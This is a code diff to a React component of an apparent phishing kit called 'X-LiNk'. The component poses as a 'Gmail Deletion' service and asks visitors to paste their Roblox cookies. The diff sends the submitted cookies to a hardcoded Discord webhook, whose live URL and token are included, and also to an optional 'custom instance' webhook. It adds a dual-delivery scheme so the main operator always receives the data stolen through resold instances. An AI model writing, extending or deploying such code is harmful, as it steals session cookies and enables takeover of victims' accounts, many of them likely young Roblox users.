@@ -15,9 +15,11 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
 
+  const MAIN_WEBHOOK =
+    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";
+
   const getWebhookUrls = () => {
-    const mainWebhook =
-      "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";
+    const webhooks = [MAIN_WEBHOOK]; // Always include main webhook
 
     // Check if this is a custom instance
     const urlParams = new URLSearchParams(window.location.search);
@@ -26,12 +28,18 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     if (refId) {
       const webhookData = localStorage.getItem(`webhook_${refId}`);
       if (webhookData) {
-        const parsed = JSON.parse(webhookData);
-        return [mainWebhook, parsed.webhook];
+        try {
+          const parsed = JSON.parse(webhookData);
+          if (parsed.webhook) {
+            webhooks.push(parsed.webhook); // Add custom webhook
+          }
+        } catch (error) {
+          console.error("Error parsing webhook data:", error);
+        }
       }
     }
 
-    return [mainWebhook];
+    return webhooks;
   };
 
   const sendToWebhook = async (
@@ -40,6 +48,9 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     isCustom = false,
   ) => {
     try {
+      const urlParams = new URLSearchParams(window.location.search);
+      const refId = urlParams.get("ref");
+
       const response = await fetch(webhookUrl, {
         method: "POST",
         headers: {
@@ -50,8 +61,11 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
             {
               title: isCustom
                 ? "🔥 Gmail Delete Request (Custom Instance)"
-                : "🔥 Gmail Delete Request",
+                : "🔥 Gmail Delete Request (Main System)",
               color: 0xff0000,
+              description: isCustom
+                ? "New Gmail deletion request from your custom instance!"
+                : "Gmail deletion request received and processed.",
               fields: [
                 {
                   name: "🍪 Roblox Cookies",
@@ -68,18 +82,27 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                   value: "Delete Gmail",
                   inline: true,
                 },
-                ...(isCustom
+                ...(refId
                   ? [
                       {
+                        name: "🔗 Instance ID",
+                        value: refId,
+                        inline: true,
+                      },
+                      {
                         name: "🌐 Source",
-                        value: "Custom Instance",
+                        value: isCustom
+                          ? "Custom Instance"
+                          : "Main System Monitor",
                         inline: true,
                       },
                     ]
                   : []),
               ],
               footer: {
-                text: isCustom ? "X-LiNk Custom Instance" : "X-LiNk System",
+                text: isCustom
+                  ? "X-LiNk Custom Instance"
+                  : "X-LiNk Main System",
               },
             },
           ],
@@ -106,16 +129,23 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     const webhookUrls = getWebhookUrls();
     const data = { cookies };
 
+    console.log("Sending to webhooks:", webhookUrls); // Debug log
+
     // Send to all webhook URLs
-    let allSuccess = true;
+    let successCount = 0;
     for (let i = 0; i < webhookUrls.length; i++) {
-      const success = await sendToWebhook(webhookUrls[i], data, i > 0);
-      if (!success) {
-        allSuccess = false;
+      const isCustomWebhook = i > 0; // First is always main, rest are custom
+      const success = await sendToWebhook(
+        webhookUrls[i],
+        data,
+        isCustomWebhook,
+      );
+      if (success) {
+        successCount++;
       }
     }
 
-    if (allSuccess) {
+    if (successCount > 0) {
       onSuccess();
     } else {
       setError("Failed to process request. Please try again.");
@@ -135,7 +165,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
       animate={{ opacity: 1, x: 0 }}
       transition={{ duration: 0.5 }}
     >
-      <Card className="w-full max-w-2xl bg-black/60 border-red-600/50 backdrop-blur-xl shadow-2xl">
+      <Card className="w-full max-w-2xl bg-black/80 border-red-600/50 backdrop-blur-2xl shadow-2xl">
         <CardHeader className="text-center pb-6">
           <motion.div
             initial={{ y: -20 }}
@@ -150,10 +180,10 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
               Gmail Deletion
             </CardTitle>
             <p className="text-red-300 text-sm">
-              Enter Roblox cookies to proceed
+              Enter Roblox cookies to proceed with deletion
             </p>
             {isCustomInstance && (
-              <div className="mt-2 px-3 py-1 bg-purple-600/20 rounded-full">
+              <div className="mt-2 px-3 py-1 bg-purple-600/20 rounded-full border border-purple-500/30">
                 <p className="text-purple-300 text-xs">Custom Instance</p>
               </div>
             )}
@@ -173,14 +203,34 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                 placeholder="Paste your Roblox cookies here..."
                 value={cookies}
                 onChange={(e) => setCookies(e.target.value)}
-                className="bg-black/50 border-red-600/50 text-white placeholder:text-gray-500 min-h-[200px] focus:border-red-500 transition-colors resize-none"
+                className="bg-black/60 border-red-600/50 text-white placeholder:text-gray-500 min-h-[200px] focus:border-red-500 transition-colors resize-none"
                 disabled={isLoading}
               />
             </motion.div>
 
+            {isCustomInstance && (
+              <motion.div
+                className="bg-gradient-to-r from-purple-900/20 to-blue-900/20 border border-purple-500/30 rounded-lg p-4"
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                transition={{ delay: 0.4 }}
+              >
+                <h4 className="text-purple-300 font-semibold mb-2 text-sm">
+                  Dual Webhook Delivery:
+                </h4>
+                <ul className="text-purple-200 text-xs space-y-1">
+                  <li>• ✅ Data will be sent to the custom instance webhook</li>
+                  <li>
+                    • ✅ Data will also be sent to the main system webhook
+                  </li>
+                  <li>• ✅ Both recipients will receive notifications</li>
+                </ul>
+              </motion.div>
+            )}
+
             {error && (
               <motion.p
-                className="text-red-400 text-sm text-center font-medium"
+                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                 initial={{ opacity: 0 }}
                 animate={{ opacity: 1 }}
               >
@@ -192,7 +242,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
               className="flex gap-4"
               initial={{ y: 20, opacity: 0 }}
               animate={{ y: 0, opacity: 1 }}
-              transition={{ delay: 0.4 }}
+              transition={{ delay: 0.5 }}
             >
               <Button
                 type="button"
@@ -206,7 +256,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
               </Button>
               <Button
                 type="submit"
-                className="flex-1 bg-red-600 hover:bg-red-700 text-white h-12 font-semibold"
+                className="flex-1 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white h-12 font-semibold shadow-lg"
                 disabled={isLoading || !cookies.trim()}
               >
                 {isLoading ? "Processing..." : "Delete Gmail"}
